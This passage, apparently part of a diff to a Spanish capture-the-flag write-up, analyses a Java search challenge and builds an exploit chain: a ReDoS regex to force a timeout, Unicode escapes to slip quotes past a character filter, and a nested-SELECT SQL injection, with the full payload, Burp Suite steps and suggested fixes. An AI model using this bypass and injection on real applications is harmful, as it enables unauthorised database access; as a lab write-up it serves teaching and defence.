+            log.info("Request deserialized");
+        } catch (JsonProcessingException e) {
+            log.info("Request deserialization failed:" + e);
+            mv.setViewName("error");
+            mv.addObject("reason", "JSON deserialization failed: " + e);
+            return mv;
+        }
+```
+
+Esta función lo que hace es descmponer el `JSON` recibido en forma de `String` en sus distintos valores para así poder procesarlos más adelante, es decir, los datos a introducir por el usuario deben cumplir ese formato para ser válidos y poder ser procesados.
+
+### Función de búsqueda (WebController) - Llamada al service
+
+```{java, eval=FALSE, results=FALSE}
+        // Step 3: Search
+        boolean searchResult = searchService.search(session.getId(), searchRequest);
+        log.info("Search results: " + searchResult);
+
+        log.info("Request search ok");
+        mv.setViewName("index");
+        mv.addObject("text", searchRequest.getText());
+        mv.addObject("search", searchRequest.getSearch());
+        List<String> searchesForClient = searchService.getSearchesForClient(session.getId());
+        mv.addObject("historic", searchesForClient);
+        log.info("Searches for ip: " + searchesForClient);
+        return mv;
+```
+
+En esta última parte se procede a llamar a la función `searchService.search(session.getId(), searchRequest)` y se devuelve al usuario una página con las búsquedas que ha realizado. 
+
+Para hacer balance, hasta ahora las posibles dificultades que se han encontrado para realizar el ataque son: la longitud de los datos no puede ser superior a `100_000`, los datos introducidos no pueden contener los caracteres mencionados previamente para prevenir una posible inyección, y los datos tienen que ser válidos para que se puedan deserializar por lo que tienen que seguir un formato.
+
+### SearchService
+
+Antes de explicar la función de búsqueda del `service` a la que se ha llamado desde el `WebController`, se comprueba la función que introduce la flag en la BBDD:
+
+```{java, eval=FALSE, results=FALSE}
+    @PostConstruct
+    public void initializeSQL(){
+        log.info("Loaded flag: " + flag);
+        var searchResult = new SearchDataDB("127.0.0.1", flag, flag);
+        searchDataDBRepository.save(searchResult);
+        log.info("SQL initialization complete");
+    }
+```
+
+La flag como se observa se guarda en la base de datos como un objeto `SearchDataDB` al cual se le asigna como valor del campo `ip` 127.0.0.1, y `flag` como valor de los campos `regex` y `text`. Más adelante se verá como acceder a esos datos de la flag evitando la validación que se hace de la ip.
+
+### Función de búsqueda (SearchService) - Comprobación de la regex
+
+El código de esta parte es:
+
+```{java, eval=FALSE, results=FALSE}
+        log.info(searchRequest.toString());
+        Pattern p;
+        try {
+            p = Pattern.compile(searchRequest.getSearch());
+        } catch (Exception e){
+            log.info("Failed to compile pattern: " + searchRequest.getSearch());
+            return false;
+        }
+```
+
+En este punto, lo que se hace es comprobar que lo que se ha introducido en el campo de búsqueda de la página es una `regex` válida, ya que será lo que se utilice para buscar en el texto y comprobar si efectivamente la búsqueda es correcta. Por tanto la búsqueda tiene que ser una `regex` de `Java` que pueda ser procesada por la función `Pattern.compile()`. En caso de no serlo se producirá un error y no se ejecutará el resto.
+
+### Función de búsqueda (SearchService) - Comprobación temporal
+
+El código de esta parte es el siguiente:
+
+```{java, eval=FALSE, results=FALSE}
+        var future = executor.submit(() ->
+                p.matcher(searchRequest.getText()).matches()
+        );
+        try {
+            Boolean result = future.get(2000, TimeUnit.MILLISECONDS);
+            log.info("Modern save");
+            modernSave(id, searchRequest);
+            return result;
+        } catch (TimeoutException | RegexTimeout | ExecutionException | 
+                   InterruptedException e) {
+            log.info("Legacy save");
+            legacySave(id, searchRequest);
+            return false;
+        }
+```
+
+Lo primero que se hace es preparar la búsqueda en la base de datos usando la función `executor.submit()` y determinando las coincidencias en el texto aplicando la `regex` previamente compilada. Una de las cosas que mas llama la atención al analizar este reto es el uso de 2 funciones distintas para guardar la búsqueda del usuario. En este punto del código, la función `future.get(2000, TimeUnit.MILLISECONDS);` ejecuta la búsqueda preparada anteriormente, que en condiciones normales llamaría a la función `modernSave()` para guardar los datos pero si tarda más de 2000ms arroja una excepción y ejecuta la función `legacySave()`.
+
+### Función de búsqueda (SearchService) - Funciones de save
+
+El código referente a esta parte es el siguiente:
+
+```{java, eval=FALSE, results=FALSE}
+    private void modernSave(String id, SearchRequest searchRequest) {
+        var searchDataDB = new SearchDataDB(id, searchRequest.getText(), 
+                                            searchRequest.getSearch());
+        this.searchDataDBRepository.save(searchDataDB);
+    }
+
+    private void legacySave(String id, SearchRequest searchRequest){
+        String query = "UPDATE search_datadb SET text=?, regex=CONCAT(??) WHERE ip=?";
+        query = query.replace("??", "'" + searchRequest.getSearch() + "'");
+        log.info(query);
+        try(var connection = dataSource.getConnection();
+        var statement = connection.prepareStatement(query)){
+
+            // Usamos prepared statements para bloquear inyecciones
+            statement.setString(1, searchRequest.getText());
+            statement.setString(2, id);
+            statement.execute();
+        } catch (SQLException e) {
+            throw new RuntimeException(e);
+        }
+
+    }
+```
+
+El código de la función `modernSave` simplemente crea un objeto de tipo `SearchDataDB` y lo guarda en la BBDD. La función en la que se centra la atención es `legacySave`. Esta es la función que se ejecuta si se arroja la excepción a la hora de procesar la `regex` y lo que hace es realizar una consulta a la BBDD que consta de varias partes. La query sería `"UPDATE search_datadb SET text=?, regex=CONCAT(??) WHERE ip=?"` en la que los símbolos de interrogación hacen referencia a `prepared statements`. Como se observa abajo, la consulta utiliza `prepared statements` para evitar inyecciones, sin embargo eso solo se aplica a `searchRequest.getText()` (que se corresponde con el texto introducido por el usuario) y a `id`. Para sustituir `??` en la parte de `regex=CONCAT(??)` (la parte correspondiente a la `regex` introducida en el campo de `search` por el usuario) se usa `query.replace("??", "'" + searchRequest.getSearch() + "'");`, es decir, la BBDD no valida de antemano que lo que se vaya a introducir en el campo `regex` de la tabla `search_datadb` sea un `string`, por lo que eso podría ser susceptible de una inyección si se consigue jugar con las comillas que hacen que el texto entre ellas sea interpretado como `string` y la función `CONCAT`.
+
+### Ataque - Fundamentos y construcción
+
+Como resumen de lo explicado en los apartados anteriores, aparentemente es posible hacer una inyección ya que la consulta no usa `prepared statements` en todas las entradas del usuario, no obstante para realizarla se tendrían que superar las dificultades vistas previamente. Lo primero que habría que hacer es no superar el límite de tamaño del `input` de `100_000` el cual está puesto ahí para evitar que la ejecución de la búsqueda con la `regex` en el texto tarde más de los 2000 ms necesarios para que se utilice la función vulnerable a la inyección (ya que si se pusiera un `input` muy grande tardaría más de 2000ms si o si), tras eso el input que se envíe tiene que evitar usar los caracteres no permitidos (muy útiles en inyecciones), tiene que tener una sintaxis correcta en cuanto a la deserialización del JSON para que pueda procesarse la búsqueda, tiene que cumplir la sintaxis de las `regex` para que se pueda compilar el patrón, la búsqueda tiene que tardar más de 2 segundos en ejecutarse, y por último el texto tiene que ser válido para la sintaxis SQL y que así se pueda atacar mediante la inyección.
+
+El primer obstáculo en el que se centran los esfuerzos es en superar los 2000 ms para que se produzca la excepción y se use la función `legacySave`. Nada más observar que se ejecuta `legacySave()` si la búsqueda tarda más de 2000 ms en completarse, una de las primeras ideas que se podrían venir es que si se pone un `input` muy grande en el campo `text` la búsqueda tardaría más de ese tiempo y se produciría la excepción, no obstante para eso está puesto el límite de `100_000` comentado previamente. Si se buscan técnicas de ataques con `regex`, una de las que llaman la atención son las llamadas ReDoS (*R*egex *D*enial *o*f *S*ervice). Explicado por encima, este principio se basa en que como normalmente las `regex` tienen una complejidad exponencial en el peor de los casos, si se introduce una `evil regex` la cual analice todos los casos y un `input` al que aplicar la `regex` lo suficientemente grande, el tiempo que se tardará en procesar el texto será más grande que de costumbre y tardará más de los 2000 ms que se necesitan introduciendo un `input` no demasiado grande en comparación con lo que tomaría haciéndolo con una `regex` normal. En este caso la `evil regex` y el texto utilizado han sido:
+
+- `Evil regex`: *((a+)+)+\$*
+- `Text`: *aaaaaaaaaaaaaaaaaaaaaaaaaa!*
+
+Como se puede observar el texto introducido tiene muy poca longitud pero tardará mucho en ejecutarse debido al funcionamiento previamente explicado. 
+
+Superado el obstáculo del tiempo, lo siguiente que se hará será superar el obstáculo de los caracteres prohibidos. Como ya se ha mencionado previamente, los caracteres que valida la función `containsBadChars` son muy útiles a la hora de realizar una inyección ya que permite "escapar" de un `string` y modificar la consulta como se quiera sin que se produzca un error de sintaxis. La idea es buscar una forma de usar esos caracteres sin que los detecte el filtro, pero que después si que puedan ser aplicados en el resto del código. Para ello, se va a aprovechar una de las opciones de las `regex` y `Java` respecto a caracteres `Unicode`, ya que interpretan `'` y `\u0027` de la misma forma. Esto es perfecto en este caso ya que el filtro no detectará el carácter `'` ya que verá `\u0027` pero sin embargo más adelante será interpretado como `'` en el resto del código. 
+
+Una vez se tiene la `evil regex` y se pueden usar caracteres prohibidos, se procede a construir la inyección. Para ello se parte de la `query` base sustituyendo los `prepared statements` (que son `text` e `ip` (en este caso se usara de ejemplo 255.255.255.255)) y sustituyendo el valor que adoptará `??` quedando así:
+
+```{sql, eval=FALSE, results=FALSE}
+UPDATE search_datadb SET text='aaaaaaaaaaaaaaaaaaaaaaaaaa!', 
+  regex=CONCAT("'" + search + "'") WHERE ip=255.255.255.255
+```
+
+La sintaxis de la función `CONCAT` es `CONCAT(String1, String2, ..., StringN)`, es decir, recibe una serie de `Strings` separadas por comas y las junta. El objetivo es obtener la flag (situada en los campos `search` y `text` tal y como se vio en el código) que estará almacenada en una fila de la tabla en la que `ip=127.0.0.1`. Para obtener el campo `text` se usará un `SELECT` pero hay que tener en cuenta una cosa y es que en las `query` de `UPDATE` de `MySQL` no se permite usar la base de datos objetivo del `UPDATE` en un `FROM`, es decir, si se utiliza algo como esto `UPDATE search_datadb SET text=?, regex=CONCAT('',(SELECT regex FROM search_datadb),'') WHERE ip=?` se lanzará el siguiente error: java.sql.SQLException: You can't specify target table 'search_datadb' for update in FROM clause. Para solucionar esto lo que se ha hecho es anidar otro `SELECT` y usar un alias para así evitar la restricción y poder obtener los datos. El `SELECT` que se hará por tanto para obtener ese campo es:
+
+```{sql, eval=FALSE, results=FALSE}
+SELECT text FROM (SELECT text FROM search_datadb where text like '%URJC%') AS db
+```
+
+Como se puede observar en el `SELECT` anidado, lo que se hace es seleccionar el texto de la tabla que tenga la forma `%URJC%`, es decir, que contenga esa palabra. Como solo se habrá devuelto un resultado, el `SELECT` exterior obtendrá el campo `text` y no dará error ya que se está usando un alias y no se está "extrayendo directamente" de `search_datadb` (es importante que solo se obtenga un resultado ya que la función `CONCAT()` da error si hay mas de 1 fila en alguno de los valores que se pasan como parámetro).
+
+Una vez se tiene como sacar el campo `text` que contiene la `flag`, se empieza a construir lo que hay que pasar a la página como `search` combinando la `evil regex` y la inyección además de los caracteres necesarios para que las 2 sean válidas sintácticamente en sus respectivos lugares.
+
+A la `evil regex` se le añade un `|` a cada lado para que analice la `evil regex` "por separado" a la hora de analizar el texto quedando `|((a+)+)+$|`. Para que el `CONCAT` no de error sintáctico y a la vez se puedan usar los elementos descritos previamente y de la forma correcta para obtener los datos, tiene que quedar de la siguiente forma:
+
+```{sql, eval=FALSE, results=FALSE}
+CONCAT('', '|((a+)+)+$|', (SELECT text FROM (SELECT text FROM search_datadb 
+  where text like '%URJC%') AS db), '')
+```
+
+La primera y última `'` se añaden en el código por lo que habría que habría que rellenar el campo `search` del `input` con el resto. Los caracteres `Unicode` usados son `\u0027` para las `'` y `\u0025` para los `%` quedando así lo que hay que introducir:
+
+```{sql, eval=FALSE, results=FALSE}
+\u0027,\u0027|((a+)+)+$|\u0027,(SELECT text FROM (SELECT text FROM search_datadb where 
+  text like \u0027\u0025URJC\u0025\u0027) AS db),\u0027
+```
+
+### Ataque - Realización
+
+Tras lo explicado previamente, el `serializedJSON` tiene que quedar por tanto de la siguiente forma:
+
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/sublime_text_value.png}
+  \caption{serializedJSON}
+\end{figure}
+
+Para realizar el ataque, se ha utilizado la herramienta `Burpsuite` para interceptar la petición e introducir los datos deseados en el `serializedJSON`. Lo primero que se hace es abrir la pagina del reto `https://r4-ctf-vulnerable.numa.host/` y se activa la intercepción de `burp`. Tras eso se introduce por ejemplo una `a` en cada campo para interceptar la petición y se cambia el `serializedJSON` quedando de la siguiente forma:
+
+\newpage
+
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/burpsuite_serialized_json.png}
+  \caption{serialziedJSON changed}
+\end{figure}
+
+Una vez cambiado, se selecciona el texto correspondiente a `search`, y mediante `click derecho->convert selection->URL->URL encode all characters` se codifican los caracteres en el formato correspondiente quedando de la siguiente forma:
+
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/burpsuite_serialized_json_encoded.png}
+  \caption{search encoded}
+\end{figure}
+
+Por último se hace `do intercept->response to this request` para observar la respuesta y se envía al servidor la petición. Tras llegar la respuesta se manda al navegador y como se puede observar se obtiene la flag:
+
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/el_buscador_flag_obtained.png}
+  \caption{flag obtained}
+\end{figure}
+
+## Flag
+
+La flag de este reto es por tanto: **URJC{w0w_such_vuln_chain}**
+
+## Arreglos y mejoras
+
+Este reto posee muchas trabas para impedir la inyección (comprobación de longitud, filtro de caracteres, tiempo, etc) no obstante como se ha podido observar es posible realizarla. Para arreglar la vulnerabilidad una de las cosas que se podrían hacer es en vez de filtrar los caracteres de esa forma filtrar también los caracteres en puntos del código donde se produzca la conversión de `Unicode` a su respectivo caracter para poder detectarlos. Otra de las cosas que se podrían hacer es usar `prepared statements` para todas las entradas del usuario y no solo para el campo `text`, evitando de esa forma que se pueda inyectar código en la `query`.  
+
+# Minichell
+
+
+
+## Descripción
+
+## Detección
+
+## Explicación
+
 
 
 ## Flag
 
-URJC{Python2_is_old}
+
 
 ## Arreglos y mejoras
-
-Usar raw_input() como método para leer inputs en Python2 ya que todo lo recibe lo convierte en strings. Otra opción es dejar de usar Python2 y empezar a usar Python3 cuya función input no es vulnerable.
-
-
-
-
-
